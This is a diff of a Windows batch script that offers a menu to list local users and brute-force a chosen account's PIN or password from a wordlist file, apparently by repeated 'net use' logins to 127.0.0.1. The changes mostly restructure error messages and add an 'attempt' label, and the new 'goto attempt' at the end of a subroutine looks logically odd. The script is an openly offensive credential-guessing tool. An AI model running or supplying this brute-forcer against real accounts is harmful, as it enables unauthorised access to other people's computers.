@@ -23,6 +23,7 @@ echo    ║  1. List Users     ║
 echo    ║  2. Bruteforce     ║
 echo    ║  3. Exit           ║
 echo    ╚════════════════════╝
+
 :input
 set /p "=>> " <nul
 choice /c 123 >nul
@@ -51,22 +52,27 @@ set /p user=">> "
 echo.
 echo [PIN LIST]
 set /p pinlist=">> "
-if not exist "%pinlist%" echo. && echo [91m[%error%][0m [97mFile not found[0m && pause >nul && goto start
+if not exist "%pinlist%" (
+  echo. && echo [91m[%error%][0m [97mFile not found[0m
+  pause >nul
+  goto start
+)
 net user %user% >nul 2>&1
 if /I "%errorlevel%" NEQ "0" (
-  echo.
-  echo [91m[%error%][0m [97mUser doesn't exist[0m
+  echo. && echo [91m[%error%][0m [97mUser doesn't exist[0m
   pause >nul
   goto start
 )
 net use \\127.0.0.1 /d /y >nul 2>&1
 echo.
+
+:attempt
 for /f "tokens=*" %%a in (%pinlist%) do (
   set pin=%%a
   call :varset
 )
-echo.
-echo [91m[%error%][0m [97mPIN not found[0m
+
+echo. && echo [91m[%error%][0m [97mPIN not found[0m
 pause >nul
 goto start
 
@@ -88,4 +94,4 @@ if /I "%errorlevel%" EQU "0" goto success
 set /a count=%count%+1
 goto :eof
 
-goto start
+goto attempt
